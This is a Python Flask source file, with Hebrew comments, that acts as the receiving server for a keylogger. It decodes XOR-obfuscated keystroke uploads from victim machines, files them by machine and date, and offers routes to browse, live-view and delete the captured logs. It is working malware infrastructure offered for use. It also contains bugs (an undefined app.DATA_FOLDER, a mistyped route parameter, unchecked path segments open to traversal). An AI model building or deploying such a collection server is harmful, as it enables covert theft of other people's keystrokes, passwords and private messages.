from flask import Flask, jsonify, request, render_template
import os, time, json
from datetime import datetime
app = Flask(__name__)
app.last_content = None

class Encryptor:
    def encryption_using_xor(data,key):
        encrypted_text = ''
        try:
            for i, word in enumerate(data):
                if word == '[' or word == ']' or word  == '{' or word == '}':
                    encrypted_text += word
                else:    
                    encrypted_text += chr(ord(word) ^ key)
            # print (encrypted_text)    
            return encrypted_text
        except:
             return encrypted_text

# DATA_FOLDER יכיל את הנתיב המלא לתיקייה הראשית
DATA_FOLDER = os.path.abspath("data")
os.makedirs(DATA_FOLDER, exist_ok=True)

@app.route('/')
def home():
    return render_template('Main_page.html')

@app.route('/api/keylogges', methods=['POST'])
def upload():
    # קבלת JSON
    encrypted_data = request.get_json(silent=True)
    encrypted_data = json.loads(encrypted_data)
    data = json.loads(Encryptor.encryption_using_xor(encrypted_data['data'], 4))
    if not data or "machine" not in data or "data" not in data:
        return jsonify({"error": "Invalid data"}), 400
    
    machine = data["machine"]
    content = data["data"]
    sent_time = data["time"]

    last_content = content

    #קבלת תאריך ושעה נוכחיים
    now = datetime.now()
    year = now.strftime("%Y")
    month = now.strftime("%m")
    day = now.strftime("%d")
    

    # מבנה תיקיות: DATA_FOLDER/machine/year/month/
    machine_folder = os.path.join(DATA_FOLDER, machine, year, month)
    os.makedirs(machine_folder, exist_ok=True)

    # קובץ יומי: day.txt
    file_path = os.path.join(machine_folder, f"{day}.txt")

    # כתיבת הנתונים לקובץ
    with open(file_path, "a", encoding="utf-8") as f:
        f.write(f"[{sent_time}]  {content}\n")

    return jsonify({"status": "success", "file": file_path}), 200

@app.route('/machine')
def open_search():
    return render_template('search_machine.html')

@app.route("/api/live", methods=["GET"])
def live_view():
    if app.last_content is None:
        return jsonify({"status": "no data yet"}), 200
    return jsonify({"status": "success", "data": app.last_content}), 200

@app.route("/machines")
def get_target_machines_list():
    machines = []
    #data_folder = app.DATA_FOLDER
    if not os.path.exists(DATA_FOLDER):
        return "No machines found"

    for machine in os.listdir(DATA_FOLDER):
        machines.append(machine)
    return json.dumps(machines)

@app.route("/data/<machine>/years")
def get_years_list(machine):
    global DATA_FOLDER
    print(machine)
    years = []
    machine_folder = os.path.join(DATA_FOLDER, machine)
    if not os.path.exists(machine_folder):
        return "Machine not found", 404

    for year in os.listdir(machine_folder):
        years.append(year)
    return json.dumps(years)

@app.route("/data/<machine>/<year>/months")
def get_months_list(machine, year): 
    months = []
    year_folder = os.path.join(app.DATA_FOLDER, machine, year)
    if not os.path.exists(year_folder):
        return "Year not found", 404

    for month in os.listdir(year_folder):
        months.append(month)
    return json.dumps(months)

@app.route("/data/<machine>/<year>/<month>/days")
def get_days_list(machine, year, month):
    days = []
    month_folder = os.path.join(app.DATA_FOLDER, machine, year, month)
    if not os.path.exists(month_folder):
        return "Month not found", 404

    for day_file in os.listdir(month_folder):
        if day_file.endswith(".txt"):
            days.append(day_file[:-4])  # Remove .txt extension
    return json.dumps(days)

@app.route("/data/<machine>/<year>/<month>/<day>")
def get_day_data(machine, year, month, day):    
    day_file_path = os.path.join(app.DATA_FOLDER, machine, year, month, f"{day}.txt")
    if not os.path.exists(day_file_path):
        return "Day not found", 404

    with open(day_file_path, "r", encoding="utf-8") as f:
        content = f.read()
    return content


@app.route("/data/<machine>/<year>/<month>/<day>/delete", methods=["DELETE"])
def delete_data_file(machine, year, month, day):
    global DATA_FOLDER
    day_file_path = os.path.join(DATA_FOLDER, machine, year, month, f"{day}.txt")
    
    if os.path.exists(day_file_path):
        os.remove(day_file_path)
        return '1'
    return '0'

@app.route("/data/<machine>/delete", methods=["DELETE"])
def delete_machine_data(machine):
    machine_folder = os.path.join(app.DATA_FOLDER, machine)
    if os.path.exists(machine_folder):
        for root, dirs, files in os.walk(machine_folder, topdown=False):
            for name in files:
                os.remove(os.path.join(root, name))
            for name in dirs:
                os.rmdir(os.path.join(root, name))
        os.rmdir(machine_folder)
        return True
    return False

@app.route("/data/delete_all", methods=["DELETE"])
def delete_all_data():
    if os.path.exists(app.DATA_FOLDER):
        for root, dirs, files in os.walk(app.DATA_FOLDER, topdown=False):
            for name in files:
                os.remove(os.path.join(root, name))
            for name in dirs:
                os.rmdir(os.path.join(root, name))
        return True
    return False

@app.route("/data/<machine>/<year>/delete", methods=["DELETE"])
def delete_year(machine, year):
    year_folder = os.path.join(app.DATA_FOLDER, machine, year)
    if os.path.exists(year_folder):
        for root, dirs, files in os.walk(year_folder, topdown=False):
            for name in files:
                os.remove(os.path.join(root, name))
            for name in dirs:
                os.rmdir(os.path.join(root, name))
        os.rmdir(year_folder)
        return True
    return False

@app.route("/data/<msachine>/<year>/<month>/delete", methods=["DELETE"])
def delete_month(machine, year, month):
    month_folder = os.path.join(app.DATA_FOLDER, machine, year, month)
    if os.path.exists(month_folder):
        for root, dirs, files in os.walk(month_folder, topdown=False):
            for name in files:
                os.remove(os.path.join(root, name))
            for name in dirs:
                os.rmdir(os.path.join(root, name))
        os.rmdir(month_folder)
        return True
    return False

if __name__ == '__main__':
    app.run(debug=True)